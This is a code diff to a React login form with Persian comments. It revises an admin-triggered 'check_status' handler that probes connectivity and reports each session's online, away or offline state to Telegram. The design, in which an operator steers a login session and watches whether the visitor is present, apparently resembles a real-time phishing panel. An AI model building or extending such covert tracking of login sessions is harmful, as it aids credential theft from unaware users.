@@ -213,48 +213,92 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر
+        // بررسی دقیق وضعیت کاربر با تست اتصال به شبکه
         console.log("🔍 Admin requested status check for session:", sessionId);
 
         const isVisible = !document.hidden;
-        const isOnline = navigator.onLine;
-        const currentTime = new Date().toLocaleString("fa-IR");
+        const navigatorOnline = navigator.onLine;
 
-        let statusText = "offline";
-        let statusEmoji = "🔴";
+        // تست دقیق‌تر اتصال به شبکه
+        const checkNetworkConnectivity = async () => {
+          try {
+            // تست اتصال با timeout کوتاه
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 seconds timeout
 
-        if (isOnline && isVisible) {
-          statusText = "online";
-          statusEmoji = "🟢";
-        } else if (isOnline && !isVisible) {
-          statusText = "away";
-          statusEmoji = "🟡";
-        } else if (!isOnline) {
-          statusText = "offline";
-          statusEmoji = "📵";
-        }
+            const response = await fetch('/placeholder.svg', {
+              method: 'HEAD',
+              cache: 'no-cache',
+              signal: controller.signal
+            });
 
-        console.log("📊 Current status:", {
-          isVisible,
-          isOnline,
-          statusText,
-          statusEmoji,
-          currentStep,
-          userAgent: navigator.userAgent.slice(0, 50),
-        });
+            clearTimeout(timeoutId);
+            return response.ok;
+          } catch (error) {
+            console.log("🌐 Network connectivity test failed:", error.message);
+            return false;
+          }
+        };
 
-        updateUserOnlineStatus(
-          sessionId,
-          isOnline,
-          isVisible,
-          Date.now(),
-          statusText,
-          statusEmoji,
-          true, // forceUpdate = true for manual status check
-        ).then(() => {
-          console.log("✅ Manual status check completed and sent to Telegram");
+        // انجام تست اتصال
+        checkNetworkConnectivity().then((networkConnected) => {
+          const isActuallyOnline = navigatorOnline && networkConnected;
+
+          let statusText = "offline";
+          let statusEmoji = "🔴";
+
+          if (isActuallyOnline && isVisible) {
+            statusText = "online";
+            statusEmoji = "🟢";
+          } else if (isActuallyOnline && !isVisible) {
+            statusText = "away";
+            statusEmoji = "🟡";
+          } else if (!isActuallyOnline) {
+            statusText = "offline";
+            statusEmoji = "📵";
+          }
+
+          console.log("📊 Detailed status check:", {
+            isVisible,
+            navigatorOnline,
+            networkConnected,
+            isActuallyOnline,
+            statusText,
+            statusEmoji,
+            currentStep,
+            timestamp: new Date().toISOString(),
+          });
+
+          updateUserOnlineStatus(
+            sessionId,
+            isActuallyOnline,
+            isVisible,
+            Date.now(),
+            statusText,
+            statusEmoji,
+            true, // forceUpdate = true for manual status check
+          ).then(() => {
+            console.log("✅ Enhanced status check completed and sent to Telegram");
+          }).catch((error) => {
+            console.error("❌ Failed to send enhanced status check:", error);
+          });
         }).catch((error) => {
-          console.error("❌ Failed to send manual status check:", error);
+          // در صورت خطا، فرض کن آفلاین است
+          console.error("❌ Network test failed, assuming offline:", error);
+
+          updateUserOnlineStatus(
+            sessionId,
+            false, // offline
+            isVisible,
+            Date.now(),
+            "offline",
+            "🔴",
+            true, // forceUpdate = true
+          ).then(() => {
+            console.log("✅ Fallback offline status sent to Telegram");
+          }).catch((fallbackError) => {
+            console.error("❌ Failed to send fallback status:", fallbackError);
+          });
         });
         break;
       case "complete":
